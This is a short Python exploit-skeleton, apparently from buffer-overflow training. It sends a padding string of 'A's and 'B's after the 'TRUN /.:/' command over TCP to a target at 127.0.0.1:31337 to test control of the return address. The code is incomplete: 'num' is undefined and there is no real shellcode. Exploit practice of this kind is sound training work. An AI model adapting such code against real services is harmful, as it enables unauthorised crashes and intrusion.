#!/usr/bin/python 
import socket,sys 

shellcode = "A" * num + "B" * 4 #replace num with exact match offset

RHOST = "127.0.0.1" #IP address of the target machine, example: "10.10.10.0" 
RPORT = 31337 #Port number of the target machine, example: 21 
 
try: 
	
	 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
	 s.connect((RHOST,RPORT)) 
	 s.send('TRUN /.:/' + shellcode + "\r\n") #replace TRUN with spike result, or remove 'TRUN /.:/' if no commands 
	 s.close() 
	
except: 
	 
	 print("Error connecting to server") 
	 sys.exit()
